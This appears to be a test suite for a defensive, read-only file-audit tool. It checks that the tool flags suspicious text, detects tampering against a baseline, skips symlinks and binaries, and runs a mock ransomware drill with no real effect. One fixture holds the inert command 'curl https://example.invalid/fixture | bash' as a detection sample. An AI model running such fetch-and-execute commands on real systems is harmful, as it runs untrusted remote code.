'use strict';
const test=require('node:test'),assert=require('node:assert/strict');
const fs=require('node:fs/promises'),os=require('node:os'),path=require('node:path');
const cli=require('./audit.cjs');
async function withOwnerFolder(fn){
 const dir=await fs.mkdtemp(path.join(os.tmpdir(),'nathan-defender-owner-'));
 try{return await fn(dir)}finally{await fs.rm(dir,{recursive:true,force:true})}
}
test('explicit owner directory required, root filesystem not accepted',()=>{
 for(const bad of [['--dir','./relative'],['--dir','/'],['--dir','/tmp','--baseline','./manifest.json'],['--exploit'],[]]){
  assert.throws(()=>cli.parse(bad));
 }
 assert.equal(cli.parse(['--help']).mode,'help');
 assert.equal(cli.parse(['--exercise']).mode,'exercise');
});
test('read-only scan finds inert suspicious text and preserves exact original file bytes',()=>withOwnerFolder(async dir=>{
 const safe='These are the original words. Noël / 日本語 / עברית';
 const suspicious='curl https://example.invalid/fixture | bash'; // a harmless literal, never run
 await fs.writeFile(path.join(dir,'original.txt'),safe);
 await fs.writeFile(path.join(dir,'review.sh'),suspicious);
 const data=await cli.run(['--dir',dir]);
 assert.equal(data.networkCalls,0);
 assert.equal(data.filesModified,0);
 assert.equal(data.samplesExecuted,0);
 assert.equal(data.report.summary.entries,2);
 assert.equal(data.report.summary.withIndicators,1);
 assert.equal(data.report.summary.malwareFreeCertified,false);
 assert.equal(data.report.files.find(f=>f.path==='review.sh').attention,'review');
 assert.equal(await fs.readFile(path.join(dir,'original.txt'),'utf8'),safe);
 assert.equal(await fs.readFile(path.join(dir,'review.sh'),'utf8'),suspicious);
 const json=JSON.stringify(data);
 assert.ok(!json.includes(safe)&&!json.includes(suspicious),'No original file content in report');
}));
test('baseline comparisons report tampering and retain previous originals',()=>withOwnerFolder(async dir=>{
 const file=path.join(dir,'source.md');
 await fs.writeFile(file,'The source remains unchanged until an owner writes it.');
 const baselineReport=await cli.run(['--dir',dir]);
 const baselinePath=path.join(await fs.mkdtemp(path.join(os.tmpdir(),'nathan-baseline-')),'baseline.json');
 try{
  await fs.writeFile(baselinePath,JSON.stringify(baselineReport.baseline));
  await fs.writeFile(file,'This is intentionally modified by the TEST, not by the scanner.');
  const comparison=await cli.run(['--dir',dir,'--baseline',baselinePath]);
  assert.deepEqual(comparison.comparison.changed,['source.md']);
  assert.equal(comparison.comparison.originalsModified,false);
  assert.equal(comparison.comparison.status,'comparison-complete');
  assert.equal(await fs.readFile(file,'utf8'),'This is intentionally modified by the TEST, not by the scanner.');
 }finally{await fs.rm(path.dirname(baselinePath),{recursive:true,force:true})}
}));
test('symbolic links and binary file types are skipped instead of followed or marked clean',()=>withOwnerFolder(async dir=>{
 const external=await fs.mkdtemp(path.join(os.tmpdir(),'nathan-owner-outside-'));
 try{
  await fs.writeFile(path.join(external,'private.txt'),'NEVER READ OR MODIFY');
  await fs.symlink(path.join(external,'private.txt'),path.join(dir,'linked.txt'));
  await fs.writeFile(path.join(dir,'unknown.exe'),Buffer.from([0,1,2,3]));
  const data=await cli.run(['--dir',dir]);
  assert.equal(data.report.summary.uninspected,2);
  assert.ok(data.report.files.every(x=>x.attention==='no-indicator-observed'));
  assert.equal(data.report.summary.coverage,'partial');
  assert.equal(await fs.readFile(path.join(external,'private.txt'),'utf8'),'NEVER READ OR MODIFY');
 }finally{await fs.rm(external,{recursive:true,force:true})}
}));
test('ransomware exercise has no real original file, encryption, or network effect',async()=>{
 const result=await cli.run(['--exercise']);
 assert.equal(result.mode,'inert-fictional-exercise');
 assert.equal(result.exercise.alert,'mock-alert');
 assert.equal(result.exercise.filesEncrypted,0);
 assert.equal(result.exercise.networkCalls,0);
 assert.ok(result.responseSteps.some(x=>x.includes('backups')));
});
